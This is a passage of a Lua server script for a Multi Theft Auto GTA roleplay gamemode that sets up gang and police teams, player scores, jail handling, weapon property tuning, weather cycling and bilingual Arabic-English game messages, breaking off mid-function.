--[[

    بامكان الجميع استخدامه بدون استثناء
	Everyone can use it without exception

--]]

--Last Edit : By SolidSnake--
--The Following Changes :--
--1- Bribe Disabled - Done
--2- Code Rewritten required : Arrays & Tables to be added
--3- Jail Cannot be opened due to lag ....to be closing it
--4- Un necessary languages to be deleted to decrease variables which may lead to reduce ram load
--5- WWE to be disabled & disable variables of text comes with it --99% recheck if needed!
--6- ===========search "@" for further additions / fixes===========
--7- More weathers to be added
--8- Delete/ disable unused functions?
--9- restore Bribe
--10- Fixed bugs
--11- Create new teams C2 --
--12- Weapon ammo slots (2,6,8) fixed Line: from 3665 to 3765 By TAPL
--13- edit the blip for players visibleDistance 600 By HoLsTeN
--14- Disabled these languages (FR,TR,RU,ES,BR,GR) Only Arabic & English  By SolidSnake
--15- Disabled unnecessary function "FSEndWWE"

function givePlayerScore (player,value)
    if isElement(player) and value then
	    local data = getElementData(player,"Scores") or 0
	    if tonumber(value) then
		    if tonumber(value) < 0 then
			    if tonumber(data)+tonumber(value) > -20 then
			        setElementData(player,"Scores",tonumber(data)+tonumber(value))
				else
                    setElementData(player,"Scores",-20 ) 
			    end
			else
 			    setElementData(player,"Scores",tonumber(data)+tonumber(value)) 
			end
		end
	end
end


function GScore(value)
	if tonumber(value) then
        givePlayerScore (source,tonumber(value))
	end
end
addEvent("givePlayerScore", true)
addEventHandler("givePlayerScore", resourceRoot, GScore)

function setPointMissionPlayer (me)
    if not isElement(me) then return end 
    local resource = getResourceFromName( "MissionsPlayer" )
	if resource then
		if getResourceState( resource ) == "running" then
		    local data = getElementData(me,"M:ID") or 1
		    if data == 5 then
		        local data2 = getElementData(me,"M:Count") or 0
		        setElementData(me,"M:Count",tonumber(data2)+tonumber(1))
		    	if (tonumber(data2)+tonumber(1)) == 3 then
		    		setElementData(me,"M:Count",0)
		    		setElementData(me,"M:ID",tonumber(data)+tonumber(1))
		        end
			elseif data == 10 then
		        local data2 = getElementData(me,"M:Count") or 0
		        setElementData(me,"M:Count",tonumber(data2)+tonumber(1))
		    	if (tonumber(data2)+tonumber(1)) == 10 then
		    		setElementData(me,"M:Count",0)
		    		setElementData(me,"M:ID",tonumber(data)+tonumber(1))
		        end
			elseif data == 14 then
		        local data2 = getElementData(me,"M:Count") or 0
		        setElementData(me,"M:Count",tonumber(data2)+tonumber(1))
		    	if (tonumber(data2)+tonumber(1)) == 20 then
		    		setElementData(me,"M:Count",0)
		    		setElementData(me,"M:ID",tonumber(data)+tonumber(1))
		        end				
		    end
		end	
	end
end

NewWeapon = true
resetTimer_ = resetTimer

function resetTimer (Timer)
    if Timer and isTimer(Timer) then
	   resetTimer_(Timer)
    end
end

function givePlayerPoints (player,Data,Point)
 if not player or not Data or not Point then return end
 local resource = getResourceFromName( "Gta_AR_Tops" )
	if resource then
		if getResourceState( resource ) == "running" then
		   exports[resource]:GivePlayerPoint(player,Data,Point)
		end
	end
end	

function PADJ(account,data,json)
	local len,pla,plb,pta,ptb,ptc = #json
	--outputChatBox(len)
	if len > 2000 then
		pla = math.ceil(len/3)
		plb = pla*2
		pta = string.sub(json,1,pla)
		ptb = string.sub(json,pla+1,plb)
		ptc = string.sub(json,plb+1)
		--outputChatBox("22222222")
	elseif len > 1000 then
		pla = math.ceil(len/2)
		pta = string.sub(json,1,pla)
		ptb = string.sub(json,pla+1)
		--outputChatBox("1111111111111111")
	else
		pta = json
	end
	SPAD(account,data,pta,ptb,ptc)
end

function SPAD(account,data,arga,argb,argc)
	setAccountData(account,data,arga)
	setAccountData(account,data.."B",argb)
	setAccountData(account,data.."C",argc)
end
 
function GADJ(account,data)
	local val = getAccountData(account,data)
	local valb = getAccountData(account,data.."B")
	local valc = getAccountData(account,data.."C")
	if valc then
		val = val..""..valb..""..valc
	elseif valb then
		val = val..""..valb
	end
	return val
end

function table.empty(arga)
    if type(arga) ~= "table" then
        return false
    end
    
    return not next(arga)
end

WSkill = {
[22]=69,
[23]=70,
[24]=71,
[25]=72,
[26]=73,
[27]=74,
[28]=75,
[29]=76,
[30]=77,
[31]=78,
[32]=75,
[33]=79,
[34]=79
}

function setPedAnimationN (thePed,block,anim,time,loop,updatePosition,interruptable,freezeLastFrame )
     if isElement(thePed) then
	    if not block then
		  setPedAnimation (thePed ,false )
		else
          setPedAnimation (thePed ,block or nil,anim or nil,time or -1,loop or false,updatePosition or false,interruptable or false,freezeLastFrame or true )
	    end
	 end
end

--[[function moveObject (theObject,time,targetx,targety,targetz,moverx,movery,moverz,strEasingType,fEasingPerio,fEasingAmplitude,fEasingOvershoot)
         if isElement(theObject) and time and targetx and targety and targetz then
		    moveObject (theObject,time,targetx,targety,targetz,moverx or 0,movery or 0,moverz or 0,strEasingType or false,fEasingPerio or false,fEasingAmplitude or false,fEasingOvershoot or false)
		 end
end]]

function SetElementInterior (theElement,interior,x,y,z)
         if isElement(theElement) and interior then
		   if x and y and z then
		        setElementInterior (theElement,interior,x or false ,y or false,z or false)
		   else
		      setElementInterior (theElement,interior)
		   end
		 end
end

function SetElementPosition (theElement,x,y,z)
         if isElement(theElement) and x and y and z then
		        setElementPosition (theElement,x,y,z)
		 end
end

function SetElementDimension (theElement,value)
         if isElement(theElement) and tonumber(value) then
		        setElementDimension (theElement,tonumber(value) or 0)
		 end
end

function getTeamN(player)
    local team = getPlayerTeam(player)
     if team then
          return getTeamName(team)
     end
end

function BestesSpawn (arga,argb,argc,argd,arge)
	local argf,argg,argh
	if arge == Police then
		argf = "PLVL"
		argg = "PPerk"
		argh = "NPPerk"
		if getElementData(source,"BPerk") then
			FDSPPE(source,"BPerk")
		end
	else
		argf = "GLVL"
		argg = "GPerk"
		argh = "NGPerk"
		if getElementData(source,"EPerk") then
			FDSPPE(source,"EPerk")
		end
		if arge == Grove or arge == Ballas or arge == Vagos or arge == Aztec then
			giveWeapon(source,41,99999)
		end
	end
	setPedFightingStyle(source,15)
	--removeElementData(source,"PTF")
	if getElementData(source,argh) and getElementData(source,argh) ~= getElementData(source,argg) then
		if getElementData(source,argh) == 3 and getElementData(source,argf) > 14 or getElementData(source,argh) == 2 and getElementData(source,argf) > 9 or getElementData(source,argh) == 1 and getElementData(source,argf) > 4 or getElementData(source,argh) == 0 then
			setElementData(source,argg,getElementData(source,argh))
			if arge == Police then
				if getElementData(source,"EPerk") and getElementData(source,argg) ~= 3 then
					FDSPPE(source,"EPerk")
				elseif getElementData(source,argg) == 3 and not getElementData(source,"EPerk") then
					local x,y,z = getElementPosition(source)
					--RS[source] = createObject(3081,x,y,z)
					obj = createObject(3081,x,y,z)
					setElementData(source,"EPerk",obj)
					setElementCollisionsEnabled(obj,false)
					exports.bone_attach:attachElementToBone(obj,source,9,.1,.15,.35,30,195,-70)--exports.bone_attach:attachElementToBone(RS[source],source,9,0,.1,.4,30,195,-70)--exports.bone_attach:attachElementToBone(RS[source],source,11,.2,-.05,.15,135,15,0)--exports.bone_attach:attachElementToBone(RS[source],source,11,0,.6,-.2,0,-90,90)
					setPedFightingStyle(source,6)
					triggerClientEvent("DCWE",resourceRoot,obj)
				end
			else
				if getElementData(source,"BPerk") then
					FDSPPE(source,"BPerk")
				end
			end
		end
	end
end
addEventHandler("onPlayerSpawn",root,BestesSpawn)



CashFdia = 10000 

GWIPIp = "141.95.54.114"
GWPPort = "22003"


hospitalsTable = {
{ 1177.7994384766, -1323.0667724609, 14.088536262512 },
{ -2656.2421875, 635.99420166016, 14.453125 },
{ 1607.1225585938, 1817.8732910156, 10.8203125 },
}
for k,v in pairs(hospitalsTable) do
    createBlip ( v[1], v[2], v[3],22,2,255,0,0,255,0,400 )
end 
 

function getTeamN(player)
    local team = getPlayerTeam(player)
     if team then
          return getTeamName(team)
     end
end



function getDistancePlayerToJail(thePlayer)
      local nearest = nil
      local min = 999999
      for key,val in pairs(hospitalsTable) do
        local xx,yy,zz=getElementPosition(thePlayer)
        local x1=val[1]
        local y1=val[2]
        local z1=val[3]
        local dist = getDistanceBetweenPoints2D(xx,yy,x1,y1)
        if dist<min then
          nearest = val
          min = dist
        end
      end
      return nearest[1],nearest[2],nearest[3]
end

function JailPossition(PLR,prsnr)--arga
	if client then--and not arga
		CICTC(eventName,source,PLR)
	else
		fake = nil
	end
	if not fake then
		exports["[MG]PoliceStation"]:JailPossition(prsnr)
	end
end
addEvent("SetPisstionJail",true)
addEventHandler("SetPisstionJail", resourceRoot, JailPossition)


Grove = createTeam("Grove Street", 0, 128, 0)
Ballas = createTeam("Ballas", 128, 0, 128)
Vagos = createTeam("Vagos", 255, 200, 0)
Aztec = createTeam("Aztec", 0, 128, 255)
Medic = createTeam("Medic", 24, 198, 238)
Rifa = createTeam("Rifa", 250,128,114)
Champions = createTeam("Champions", 104,104,104)
Champions2 = createTeam("Champions2", 255,0,255)
Mafia = createTeam("Mafia", 154,205,50)
Russians = createTeam("Russians" ,160,82,45)
Police = createTeam("Police", 0, 0, 255)
NoTeam = createTeam("No Team", 255, 0, 0)
Mission = createTeam("Mission",200,200,200)

ChampionsValue = "OFF"
Champions2Value = "OFF"


setTeamFriendlyFire(Ballas, false)
setTeamFriendlyFire(Grove, false)
setTeamFriendlyFire(Vagos, false)
setTeamFriendlyFire(Aztec, false)
setTeamFriendlyFire(Police, false)
setTeamFriendlyFire(Medic, false)
setTeamFriendlyFire(Rifa, false)
setTeamFriendlyFire(Champions, false)
setTeamFriendlyFire(Champions2, false)
setTeamFriendlyFire(Mafia, false)
setTeamFriendlyFire(Russians, false)
setTeamFriendlyFire(Mission, false)


setTime(0, 0)
setWeather(5)
wb = 10

if NewWeapon then
stats = {
        --[[[69]=500,
        [70]=999,
        [71]=999,
        [72]=999,
        [73]=500,
        [74]=999,
        [75]=500,
        [76]=999,
        [77]=999,
        [78]=999,
        [79]=999,]]
        [160]=999,
        [225]=999,
        [229]=999,
        [230]=999
}
else
stats = {
        [69]=500,
        [70]=999,
        [71]=999,
        [72]=999,
        [73]=500,
        [74]=999,
        [75]=500,
        [76]=999,
        [77]=999,
        [78]=999,
        [79]=999,
        [160]=999,
        [225]=999,
        [229]=999,
        [230]=999
}
end

function setStat(player)
	for statID,value in pairs(stats) do
		setPedStat(player, statID, value)
	end
end

addEventHandler("onPlayerCommand", root, function(cmd)
    if cmd == "logout" 
	or cmd == "register"
	or cmd == "msg" or cmd == "me" then
        cancelEvent()
    end
end)


RSIV = {}

--[[hpcfailed = {}
ar1text = {}
ar2text = {}
car1text = {}
car2text = {}
esc1text = {}
esc2text = {}
cesc1text = {}
cesc2text = {}
btetext = {}
btstext = {}
--@ebttext = {}
--@sbttext = {}
fhptext = {}
ahptext = {}
wrntext = {}
hr1text = {}
hr2text = {}
phdtext = {}
arbtext = {}
rrb1text = {}
rrb2text = {}
brdtext = {}
shptext = {}
shr1text = {}
shr2text = {}
hpt1text = {}
hpt2text = {}
rmb1text = {}
rmb2text = {}
mrmb1text = {}
mrmb2text = {}
mrmb3text = {}
frbtext = {}
amr1text = {}
amr2text = {}
phdr1text = {}
phdr2text = {}
bc1text = {}
bc2text = {}
tk1text = {}
tk2text = {}
tkp1text = {}
tkp2text = {}
yph1text = {}
yph2text = {}
pmltext = {}
ybktext = {}
yhktext = {}
afhtext = {}
ybrtext = {}
hrytext = {}
efhtext = {}
yhetext = {}
hbrtext = {}
ygmtext = {}
gymtext = {}]]
--[[hwmtext = {}
mwstext = {}
nwmtext = {}
shjtext = {}]]--@--
--[[htm1text = {}
htm2text = {}
yht1text = {}
yht2text = {}]]
--dhwmtext = {}
--nidtext = {}
--tfstext = {}
--csmtext = {}

--kidnapper = {}

send = {}

plng = {}
tlng={
{'You have been arrested by officer ',
'',
'You have arrested ',
'',
'You have escaped from ',
'',
'',
' has escaped from you!',
"Hacking LSPD PC has failed!",
"!!!Attempting to hack LSPD PC, don't leave your position!!!",
"                !!!Warning!!!",
'*Report from LSPD: ',
' is hacking LSPD PC!',
"There was someone has hacked LSPD PC, PC has shut down!",
"!!!Attempting to open the gate, don't leave your position!!!",
'*Report from Bank: ',
' is Attempting to rob the bank!',
"There was someone has robbed the bank before!",
"You successfully hacked LSPD PC all jails has opened!",
'*Report from LSPD: ',
' has hacked LSPD PC and opened all jails!',
'',
' has hacked LSPD PC and opened all jails for you!',
'You Robbed $',
'',
'* ',
' has robbed: $',
' from bank!',
"You failed to Rob the bank!",
'You have earned $',
'',
'*Report from LSPD: The prisoner ',
' has escaped from the jail!',
'The officer ',
' is responsible for the escape of the prisoner!',
'You have offered ',
' to pay his ticket',
' has paid his ticket cost $',
'',
'You have placed a hit on',
'for',
"Player with this ID might be left the server!",
'you have been kidnapped by',
'You have kidnapped',
"The cops attempting to free all your hostages!",
"The cops have rescued you",
'has rescued you',
"you have earned $"..CashFdia.." from a hostage",
"This player has been robbed before!",
'has transferred',
'to your bank account',
'You have successfully transferred',
'to'},
{'',
' تم القبض عليك بواسطة الشرطي',
'',
' تم القبض على',
'',
' لقد هربت من قبضة',
'!منك ',
' لقد أفلت',
"!عملية تهكير كمبيوتر مركز الشرطة فشلت",
"!!!يتم الآن تهكير كمبيوتر مركز الشرطة، لاتغادر مكانك!!!",
"                      !!!إنذار!!!",
'!يقوم بتهكير كمبيوتر مركز الشرطة ',
' :بلاغ من مركز الشرطة',
"!قام أحدهم بتهكير الكمبيوتر، الكمبيوتر الآن لا يعمل",
"!!!يتم الآن فتح البوابة، لا تغادر مكانك!!!",
'!يقوم بسرقة المال ',
' :بلاغ من البنك',
"!قام أحدهم بسرقة البنك من قبل",
"!تم التهكير بنجاح جميع أبواب الزنزانات تم فتحها",
'!قام بتهكير كمبيوتر مركز الشرطة وفتح جميع أبواب الزنزانات ',
' :بلاغ من مركز الشرطة',
'!بتهكير كمبيوتر مركز الشرطة وفتح أبواب الزنزانات لكم ',
' قام',
'$',
' لقد سرقت',
'',
' من البنك من قبل اللاعب $',
' تمت سرقة',
"!لقد فشلت في سرقة البنك",
'$',
' لقد حصلت على',
'من السجن ',
' بلاغ من مركز الشرطة: فر السجين',
'!مسؤول عن هروب السجين ',
' الشرطي',
'بدفع الغرامة انتظر قليلاً لتستلمها ',
' لقد أمرت',
' من اللاعب $',
' لقد استلمت غرامة قدرها',
'لقد وضغت جائزة على',
'قدرها',
"!اللاعب بهذا الرقم ربما قد خرج من السيرفر",
'!قام باختطافك',
'لقد اختطفت',
"!رجال الشرطة يحاولون تحرير جميع رهائنك",
"لقد أنقذك رجال الشرطة",
' لقد أنقذك',
"لقد حصلت على "..CashFdia.."$ من أحد الرهائن",
"!تمت سرقة هذا اللاعب من قبل",
'قام بتحويل',
'إلى حسابك بالبنك',
'تم بنجاح تحويل',
'إلى'}
}

function notification(player,c, e, s, t) 
	triggerClientEvent(player,"Tcheckntf",resourceRoot, c, e, s, t) 
end

addEvent("Lang", true)
function Lang(PLR,val)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			plng[PLR] = val
		end
	end
end
addEventHandler("Lang",resourceRoot,Lang)


DCPM={
["images/GEL.ttf"]="     �  0OS/2F;��  8   `cmap�"
}

AWPSP = {--all move_speed +.1
[22]={45,40,60,37,34,42,1.85,2.2,1.1,.2,.2,.2,.45,.4,.45,25,20,20},--new
[23]={50,70,70,42,34,50,2.7,1.15,1.68,.2,.2,.2,.37,.34,.4,25,27,20,2,2,2},--new
[24]={35,40,50,80,101,101,2.1,1.45,1.43,.3,.28,.3,.58,.7,.65,6,7,6,2,1.6,2,.24,.24,.24,.52,.58,.52},--new
[25]={65,50,65,30,25,30,1,1,1,.2,.25,.25,1.1,1,1.1,0,0,0,1.6,2,2,.2,.2,.2,1.1,.95,1.05},--new+old movement speed was 1.5 in all skills
[26]={40,35,45,10,12,19,.8,.7,.9,.2,.2,.2,.484,.55,.5,2,2,1},--new
[27]={40,45,40,13,15,12,2,1,1.5,.2,.26,.26,.514,.6,.45,7,12,10,1.4,1.2,1.4},--new+.2 movement speed in all skills
[28]={40,50,50,23,25,27,2.2,1.75,2.3,.2,.2,.2,.29,.29,.29,50,50,50},--new
[29]={60,80,72,27,29,28,1.7,1.35,1.55,.2,.2,.2,.284,.29,.283309,50,45,50,1.6,2,2},--new
[30]={200,150,100,38,42,31,.18,.396,.76,.2,.2,.2,.3171,.3171,.29,125,50,40,1.1,1.3,1.5},--new+old speed .9,1.2,1.5
[31]={180,130,150,35,29,33,.25,.46,.54,.2,.2,.2,.31,.31,.31,100,50,54,1.1,1.3,1.5},--new+old speed .9,1.2,1.5
[32]={50,50,50,22,26,25,1.4,1.9,2.38,.2,.2,.2,.29,.3115,.29,50,50,50},--new
[33]={260,260,260,45.46,45.46,45.46,1,1,1,.2,.2,.2,.55,.55,.55,15,15,15},--edit the rate of fire of cooldown onClientPlayerWeaponFire of the last rifle to 350 not 300
[34]={300,300,300,136.36,136.36,136.36,1,1,1,.2,.2,.2,.9,.9,.9,5,5,5}--new rate of fire only
}

AWPSP2 = { 
 [24]={1},
 }  
 
SSWeapon = {
[26]= {73,500,"std"}, 
[23]= {70,999,"pro"}, 
[24]= {71,999,"pro"}, 
[32]= {75,500,"std"}, 
[28]= {75,500,"std"}, 
[33]= {79,999,"pro"}, 
[34]= {79,999,"pro"}, 
[30]= {77,999,"pro"}, 
[31]= {78,999,"pro"}, 
[22]= {69,500,"std"},   
[25]={72,999,"pro"}, 
[27]={74,999,"pro"}, 
[29]={76,999,"pro"}, 
}

function setWeaponProperty_ (id,stat,name,value)
    if NewWeapon then
        setWeaponProperty(id,stat,name,value)
	end		 
end

for k,v in pairs(AWPSP) do
	setWeaponProperty_(k,"poor","weapon_range",v[1])
	setWeaponProperty_(k,"std","weapon_range",v[2])
	setWeaponProperty_(k,"pro","weapon_range",v[3])
	setWeaponProperty_(k,"poor","damage",v[4])
	setWeaponProperty_(k,"std","damage",v[5])
	setWeaponProperty_(k,"pro","damage",v[6])
	setWeaponProperty_(k,"poor","accuracy",v[7])
	setWeaponProperty_(k,"std","accuracy",v[8])
	setWeaponProperty_(k,"pro","accuracy",v[9])
	setWeaponProperty_(k,"poor","anim_loop_start",v[10])
	setWeaponProperty_(k,"std","anim_loop_start",v[11])
	setWeaponProperty_(k,"pro","anim_loop_start",v[12])
	setWeaponProperty_(k,"poor","anim_loop_bullet_fire",v[10]+.0001)
	setWeaponProperty_(k,"std","anim_loop_bullet_fire",v[11]+.0001)
	setWeaponProperty_(k,"pro","anim_loop_bullet_fire",v[12]+.0001)
	setWeaponProperty_(k,"poor","anim_loop_stop",v[13])
	setWeaponProperty_(k,"std","anim_loop_stop",v[14])
	setWeaponProperty_(k,"pro","anim_loop_stop",v[15])
	brka = v[13]-v[10]+.01
	brkb = v[14]-v[11]+.01
	brkc = v[15]-v[12]+.01
	if brka < .7 then
		brka = .7
	end
	if brkb < .7 then
		brkb = .7
	end
	if brkc < .7 then
		brkc = .7
	end
	setWeaponProperty_(k,"poor","anim_breakout_time",brka)
	setWeaponProperty_(k,"std","anim_breakout_time",brkb)
	setWeaponProperty_(k,"pro","anim_breakout_time",brkc)
	if v[22] then
		setWeaponProperty_(k,"poor","anim2_loop_start",v[22])
		setWeaponProperty_(k,"std","anim2_loop_start",v[23])
		setWeaponProperty_(k,"pro","anim2_loop_start",v[24])
		setWeaponProperty_(k,"poor","anim2_loop_bullet_fire",v[22]+.0001)
		setWeaponProperty_(k,"std","anim2_loop_bullet_fire",v[23]+.0001)
		setWeaponProperty_(k,"pro","anim2_loop_bullet_fire",v[24]+.0001)
		setWeaponProperty_(k,"poor","anim2_loop_stop",v[25])
		setWeaponProperty_(k,"std","anim2_loop_stop",v[26])
		setWeaponProperty_(k,"pro","anim2_loop_stop",v[27])
	else
		setWeaponProperty_(k,"poor","anim2_loop_start",v[10])
		setWeaponProperty_(k,"std","anim2_loop_start",v[11])
		setWeaponProperty_(k,"pro","anim2_loop_start",v[12])
		setWeaponProperty_(k,"poor","anim2_loop_bullet_fire",v[10]+.0001)
		setWeaponProperty_(k,"std","anim2_loop_bullet_fire",v[11]+.0001)
		setWeaponProperty_(k,"pro","anim2_loop_bullet_fire",v[12]+.0001)
		setWeaponProperty_(k,"poor","anim2_loop_stop",v[13])
		setWeaponProperty_(k,"std","anim2_loop_stop",v[14])
		setWeaponProperty_(k,"pro","anim2_loop_stop",v[15])
	end
	if k ~= 25 and k ~= 34 then
		setWeaponProperty_(k,"poor","maximum_clip_ammo",v[16])
		setWeaponProperty_(k,"std","maximum_clip_ammo",v[17])
		setWeaponProperty_(k,"pro","maximum_clip_ammo",v[18])
	end
	if v[19] then
		setWeaponProperty_(k,"poor","move_speed",v[19])
		setWeaponProperty_(k,"std","move_speed",v[20])
		setWeaponProperty_(k,"pro","move_speed",v[21])
	end
	if k == 22 or k == 26 or k == 28 or k == 32 then
		setWeaponProperty_(k,"pro","flags",0x000800)
	else
		setWeaponProperty_(k,"poor","flags",0x000010)
		setWeaponProperty_(k,"poor","flags",0x000020)
		setWeaponProperty_(k,"std","flags",0x000020)
		if k > 32 then
			setWeaponProperty_(k,"poor","flags",0x008000)
			setWeaponProperty_(k,"std","flags",0x000020)
			if k > 33 then
				setWeaponProperty_(k,"std","flags",0x000010)
			end
		end
	end  
end
brka,brkb,brkc = nil,nil,nil



addEventHandler("onResourceStop",resourceRoot,
function()
	xmlSaveFile(FXML)
	xmlUnloadFile(FXML)
	for k,v in pairs(getElementsByType("vehicle")) do
		destroyElement(v)
	end
	for _, players in pairs(getElementsByType("player")) do
		removeElementData(players,"MCH")
		removeElementData(players,"EPerk")
		removeElementData(players,"BPerk")
		removeElementData(players,"NPPerk")
		removeElementData(players,"NGPerk")
		removeElementData(players,"HSHTR")
		removeElementData(players,"HSHTRH")
		saveAccount(players)
	end
	--[[setWeaponProperty(41,"poor","weapon_range",getOriginalWeaponProperty(41,"poor","weapon_range"))
	setWeaponProperty(41,"std","weapon_range",getOriginalWeaponProperty(41,"poor","weapon_range"))
	setWeaponProperty(41,"pro","weapon_range",getOriginalWeaponProperty(41,"poor","weapon_range"))]]
	for k,v in pairs(AWPSP) do
		setWeaponProperty_(k,"poor","weapon_range",getOriginalWeaponProperty(k,"poor","weapon_range"))
		setWeaponProperty_(k,"std","weapon_range",getOriginalWeaponProperty(k,"std","weapon_range"))
		setWeaponProperty_(k,"pro","weapon_range",getOriginalWeaponProperty(k,"pro","weapon_range"))
		setWeaponProperty_(k,"poor","damage",getOriginalWeaponProperty(k,"poor","damage"))
		setWeaponProperty_(k,"std","damage",getOriginalWeaponProperty(k,"std","damage"))
		setWeaponProperty_(k,"pro","damage",getOriginalWeaponProperty(k,"pro","damage"))
		setWeaponProperty_(k,"poor","accuracy",getOriginalWeaponProperty(k,"poor","accuracy"))
		setWeaponProperty_(k,"std","accuracy",getOriginalWeaponProperty(k,"std","accuracy"))
		setWeaponProperty_(k,"pro","accuracy",getOriginalWeaponProperty(k,"pro","accuracy"))
		setWeaponProperty_(k,"poor","anim_loop_start",getOriginalWeaponProperty(k,"poor","anim_loop_start"))
		setWeaponProperty_(k,"std","anim_loop_start",getOriginalWeaponProperty(k,"std","anim_loop_start"))
		setWeaponProperty_(k,"pro","anim_loop_start",getOriginalWeaponProperty(k,"pro","anim_loop_start"))
		setWeaponProperty_(k,"poor","anim_loop_bullet_fire",getOriginalWeaponProperty(k,"poor","anim_loop_bullet_fire"))
		setWeaponProperty_(k,"std","anim_loop_bullet_fire",getOriginalWeaponProperty(k,"std","anim_loop_bullet_fire"))
		setWeaponProperty_(k,"pro","anim_loop_bullet_fire",getOriginalWeaponProperty(k,"pro","anim_loop_bullet_fire"))
		setWeaponProperty_(k,"poor","anim_loop_stop",getOriginalWeaponProperty(k,"poor","anim_loop_stop"))
		setWeaponProperty_(k,"std","anim_loop_stop",getOriginalWeaponProperty(k,"std","anim_loop_stop"))
		setWeaponProperty_(k,"pro","anim_loop_stop",getOriginalWeaponProperty(k,"pro","anim_loop_stop"))
		setWeaponProperty_(k,"poor","anim2_loop_start",getOriginalWeaponProperty(k,"poor","anim2_loop_start"))
		setWeaponProperty_(k,"std","anim2_loop_start",getOriginalWeaponProperty(k,"std","anim2_loop_start"))
		setWeaponProperty_(k,"pro","anim2_loop_start",getOriginalWeaponProperty(k,"pro","anim2_loop_start"))
		setWeaponProperty_(k,"poor","anim2_loop_bullet_fire",getOriginalWeaponProperty(k,"poor","anim2_loop_bullet_fire"))
		setWeaponProperty_(k,"std","anim2_loop_bullet_fire",getOriginalWeaponProperty(k,"std","anim2_loop_bullet_fire"))
		setWeaponProperty_(k,"pro","anim2_loop_bullet_fire",getOriginalWeaponProperty(k,"pro","anim2_loop_bullet_fire"))
		setWeaponProperty_(k,"poor","anim2_loop_stop",getOriginalWeaponProperty(k,"poor","anim2_loop_stop"))
		setWeaponProperty_(k,"std","anim2_loop_stop",getOriginalWeaponProperty(k,"std","anim2_loop_stop"))
		setWeaponProperty_(k,"pro","anim2_loop_stop",getOriginalWeaponProperty(k,"pro","anim2_loop_stop"))
		setWeaponProperty_(k,"poor","anim_breakout_time",getOriginalWeaponProperty(k,"poor","anim_breakout_time"))
		setWeaponProperty_(k,"std","anim_breakout_time",getOriginalWeaponProperty(k,"std","anim_breakout_time"))
		setWeaponProperty_(k,"pro","anim_breakout_time",getOriginalWeaponProperty(k,"pro","anim_breakout_time"))
		if k ~= 25 then
			setWeaponProperty_(k,"poor","maximum_clip_ammo",getOriginalWeaponProperty(k,"poor","maximum_clip_ammo"))
			setWeaponProperty_(k,"std","maximum_clip_ammo",getOriginalWeaponProperty(k,"std","maximum_clip_ammo"))
			setWeaponProperty_(k,"pro","maximum_clip_ammo",getOriginalWeaponProperty(k,"pro","maximum_clip_ammo"))
		end
		if v[19] then
			setWeaponProperty_(k,"poor","move_speed",getOriginalWeaponProperty(k,"poor","move_speed"))
			setWeaponProperty_(k,"std","move_speed",getOriginalWeaponProperty(k,"std","move_speed"))
			setWeaponProperty_(k,"pro","move_speed",getOriginalWeaponProperty(k,"pro","move_speed"))
		end
		if k == 22 or k == 26 or k == 28 or k == 32 then
		    if k ~= 26 then
			    setWeaponProperty_(k,"poor","flags",0x000800)
			end
			setWeaponProperty_(k,"std","flags",0x000800)
		else
			setWeaponProperty_(k,"poor","flags",0x000010)
			setWeaponProperty_(k,"poor","flags",0x000020)
			setWeaponProperty_(k,"std","flags",0x000020)
			if k > 32 then
				setWeaponProperty_(k,"poor","flags",0x008000)
				setWeaponProperty_(k,"std","flags",0x000020)
				if k > 33 then
					setWeaponProperty_(k,"std","flags",0x000010)
				end
			end
		end
	end
end)

function weath()--startedResource
	--outputDebugString("server: weath")
	days = getElementData(bag,"Days")-1
	if days < 0 then
		setElementData(bag,"Days",419)
		xmlDestroyNode(PXML)
		xmlDestroyNode(HXML)
		PXML = xmlCreateChild(FXML,"PHD")
		HXML = xmlCreateChild(FXML,"AHD")
		xmlNodeSetValue(DXML,419)
		HNTFE = nil
		for k,v in pairs(getElementsByType("pickup",resourceRoot)) do
			if getElementModel(v) == 1273 then
				HSPCT = getElementData(v,"HSPC")
				HSPCT[3] = 0
				setElementData(v,"HSPC",HSPCT)
			end
		end
		local vT = {}
		for k,v in pairs(getElementsByType("player")) do
			if getElementData(v,"MCH") then
				removeElementData(v,"MCH")
				removeElementData(v,"PMS")
				table.insert(vT,v)
			end
		end
		triggerClientEvent(vT,"CHB",resourceRoot)--vT
	elseif days < 60 then
		setElementData(bag,"Days",days)
		xmlNodeSetValue(DXML,days)
		if not HNTFE then
			HNTFE = true
		end
	else
		setElementData(bag,"Days",days)
		xmlNodeSetValue(DXML,days)
	end
	xmlSaveFile(FXML)
	days = nil  
	if wb == 7 then
		wb = 10
	elseif wb == 15 then
		wb = 17
	elseif wb == 18 then
		wb = -1
	end 
	wb = wb+1
	setWeatherBlended(wb) 
	
	setTimer(weath, 1440000, 1)
end
setTimer(weath, 1000, 1)

setTimer(function()
	for _, players in pairs(getElementsByType("player")) do
		hlspdpc[players] = nil
		removeElementData(players,"Alive")
		setElementData(players, "Stats", 0)
		--setElementData(players, "Scores", 0)
		plng[players] = 2
		--setElementData(players, "Language", 0)
		setElementData(players, "Prisoners", 0)
		setElementData(players, "WantLvl", 0)
		setElementData(players, "MBail", 0, false)
		setElementData(players, "Secs", 0, false)
		setElementData(players, "Mins", 0, false)
		--setElementData(players, "ES", 1)
		setElementData(players, "GLA", 0)
		setElementData(players, "KidH", 0)
		setElementData(players, "Job", 0)
		setElementData(players, "DLP", 0)
		setElementData(players, "SDG", 0)
		setElementData(players, "MDG", 0)
		setElementData(players, "EDG", 0)
		--setElementData(players, "Bank", 0)
		setElementData(players, "TBan", 0)
		setElementData(players,"PGC",0)
		setElementData(players,"MAW",{})
		setElementData(players,"PPerk",0)
		setElementData(players,"GPerk",0)
		setElementData(players,"GLType",1)
		setElementData(players,"GType",1)
		--setElementData(players,"WPSK",{0,0,0,666,0})
		--@--setElementData(players, "Wrestler", false)
		createBlipAttachedTo ( players, 0, 2, 0, 0, 0, 255, 0, 400 ) 
		for k,v in pairs(WSkill) do
			if v > 29 and v < 32 then
				setPedStat(players,v,666)
			else
				setPedStat(players,v,0)
			end
		end
		theCurrentAccount = getPlayerAccount(players)
		loadAccount(players, theCurrentAccount)
		setStat(players)  
	end
end, 1000, 1)

for k, v in pairs (getElementsByType("vehicle")) do
	toggleVehicleRespawn(v, true)
	vx, vy, vz = getElementPosition(v)
	vrx, vry, vrz = getElementRotation(v)
	setVehicleRespawnPosition(v, vx, vy, vz, vrx, vry, vrz)
	setVehicleIdleRespawnDelay(v, 60000)
end

function respwnAllVehs(player)
	accName = getAccountName(getPlayerAccount(player))
	if isObjectInACLGroup("user." .. accName, aclGetGroup("Admin")) then
		for k, v in pairs (getElementsByType("vehicle")) do
